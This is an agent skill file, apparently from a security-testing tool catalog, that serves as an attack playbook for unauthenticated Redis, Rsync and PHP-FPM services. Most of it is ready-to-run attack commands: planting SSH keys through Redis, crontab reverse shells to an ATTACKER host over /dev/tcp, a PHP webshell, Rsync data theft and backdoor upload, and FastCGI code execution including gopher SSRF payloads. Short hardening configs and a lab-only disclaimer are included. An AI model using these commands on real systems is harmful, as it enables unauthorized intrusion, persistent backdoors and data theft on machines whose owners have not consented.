---
name: unauthorized-access-common-services
description: >-
  Unauthorized access playbook for common exposed services. Use when Redis, Rsync, PHP-FPM, AJP/Ghostcat, Hadoop YARN, H2 Console, or similar management interfaces are exposed without authentication.
---

# SKILL: Unauthorized Access to Common Services — Expert Attack Playbook

<!-- zhiyugo:contract:start -->
## ZhiyuGo workflow

Catalog mirror: `role=leaf`, `risk=lab_only`, `default=disabled`. Trusted `policy.json` remains authoritative.

- Keep this default-disabled guidance inside an explicitly isolated lab or CTF. Inspection flags do not authorize actions against a live or non-consenting system.
- Confirm the supplied artifact, environment, primitive, mitigations, and expected lab success marker before choosing a technique.
- Treat shell, exploit, credential, persistence, evasion, and lateral-movement examples as reference data; the current Tool Registry does not provide them.
- Record artifact hashes, prerequisite evidence, observed output, and the exact exit condition; otherwise return the missing prerequisite or capability.
<!-- zhiyugo:contract:end -->

> **Technical reference scope**: Expert techniques for exploiting unauthenticated or weakly authenticated management services. Covers Redis write-to-RCE, Rsync data theft, PHP-FPM code execution, Ghostcat AJP file read, Hadoop YARN job submission, and H2 Console JNDI. These are infrastructure-level findings distinct from web application vulnerabilities.

## 0. RELATED ROUTING

- `ssrf-server-side-request-forgery` when these services are reachable via SSRF (e.g., SSRF → Redis)
- `jndi-injection` when H2 Console or similar accepts JNDI connection strings
- `deserialization-insecure` when RMI Registry or T3 protocol is exposed
- `network-protocol-attacks` for layer 2/3 attacks during service enumeration
- `reverse-shell-techniques` for shell payloads after gaining command execution

### Comprehensive Port Reference

Also inspect [PORT_SERVICE_MATRIX.md](./PORT_SERVICE_MATRIX.md) when you need:
- Full exploitation matrix organized by port number (20+ services)
- Enumeration, brute force, and post-exploitation per service
- Quick triage during nmap/masscan output analysis

---

## 1. DISCOVERY — PORT SCANNING

```bash
nmap -sV -p 6379,873,9000,8009,8088,8082,1099,9200,5984,2375,27017,11211 TARGET

# Key ports:
# 6379  — Redis
# 873   — Rsync
# 9000  — PHP-FPM (FastCGI)
# 8009  — AJP (Tomcat Ghostcat)
# 8088  — Hadoop YARN ResourceManager
# 8082  — H2 Console (or embedded in Spring Boot)
# 1099  — Java RMI Registry
# 9200  — Elasticsearch
# 5984  — CouchDB
# 2375  — Docker API
# 27017 — MongoDB
# 11211 — Memcached
```

---

## 2. REDIS (PORT 6379)

### Detection

```bash
redis-cli -h TARGET ping
# Response: PONG = unauthenticated access confirmed

redis-cli -h TARGET INFO server
# Returns Redis version, OS, config
```

### Write SSH Authorized Keys

```bash
# Generate key pair:
ssh-keygen -t rsa -f redis_rsa

# Write public key to Redis, then dump to authorized_keys:
redis-cli -h TARGET flushall
cat redis_rsa.pub | redis-cli -h TARGET -x set ssh_key
redis-cli -h TARGET config set dir /root/.ssh
redis-cli -h TARGET config set dbfilename authorized_keys
redis-cli -h TARGET save

# Connect:
ssh -i redis_rsa root@TARGET
```

### Write Crontab (Reverse Shell)

```bash
redis-cli -h TARGET
> set x "\n\n*/1 * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1\n\n"
> config set dir /var/spool/cron/
> config set dbfilename root
> save
```

### Write Webshell

```bash
redis-cli -h TARGET
> set webshell "<?php system($_GET['cmd']); ?>"
> config set dir /var/www/html/
> config set dbfilename shell.php
> save
# Access: http://TARGET/shell.php?cmd=id
```

### Master-replica module-loading risk

This lab-only branch requires an external replication harness, a controlled malicious module, and an isolated target. None is a current ZhiyuGo capability. Treat the technique as reference material and require supplied module, configuration, and result evidence; otherwise report the capability gap.

### Hardening

```
requirepass STRONG_PASSWORD
bind 127.0.0.1
protected-mode yes
rename-command CONFIG ""
rename-command FLUSHALL ""
```

---

## 3. RSYNC (PORT 873)

### Detection

```bash
rsync TARGET::
# Lists available modules (shares) if anonymous access allowed

rsync -av TARGET::MODULE_NAME /tmp/loot/
# Download entire module contents
```

### Exploitation — Write Crontab

```bash
# Create reverse shell cron:
echo '*/1 * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1' > /tmp/evil_cron

# Upload to target's crontab (if writable module maps to /etc/ or similar):
rsync -av /tmp/evil_cron TARGET::MODULE/cron.d/backdoor
```

### Hardening

```
# /etc/rsyncd.conf:
auth users = rsync_user
secrets file = /etc/rsyncd.secrets
list = no
hosts allow = 10.0.0.0/8
read only = yes
```

---

## 4. PHP-FPM / FASTCGI (PORT 9000)

### Mechanism

PHP-FPM listens for FastCGI requests. If exposed to the network (instead of Unix socket), an attacker can send crafted FastCGI packets to execute arbitrary PHP code.

### Exploitation

```bash
# Using fcgi_exp or similar tool:
python3 fpm.py TARGET 9000 /var/www/html/index.php -c "<?php system('id'); ?>"

# Key parameters in FastCGI request:
# SCRIPT_FILENAME = path to any existing .php file
# PHP_VALUE = "auto_prepend_file = php://input"  (injects POST body as PHP code)
# PHP_ADMIN_VALUE = "allow_url_include = On"
```

### Key FastCGI Environment Variables for Exploitation

```text
SCRIPT_FILENAME = /var/www/html/index.php   # must point to an existing .php file
PHP_VALUE = auto_prepend_file = php://input  # injects POST body as PHP code
PHP_ADMIN_VALUE = allow_url_include = On     # enables remote inclusion
```

### Via SSRF (gopher)

```
gopher://TARGET:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00...
# Encoded FastCGI packet
# Tool: Gopherus generates the gopher:// URL
python3 gopherus.py --exploit fastcgi
```

### Hardening

```ini
; php-fpm.conf — bind to socket only:
listen = /var/run/php-fpm.sock
; If TCP required, restrict:
listen.allowed_clients = 127.0.0.1
```

---

## Detailed reference

Inspect [TECHNIQUE_REFERENCE.md](TECHNIQUE_REFERENCE.md) through explicit catalog resource tooling only when one of these advanced branches is required; the current Run does not load it automatically:

- 5. GHOSTCAT — AJP (PORT 8009) — CVE-2020-1938
- 6. HADOOP YARN RESOURCEMANAGER (PORT 8088)
- 7. H2 DATABASE CONSOLE
- 8. QUICK REFERENCE
- 9. REVERSE PROXY MISCONFIGURATION
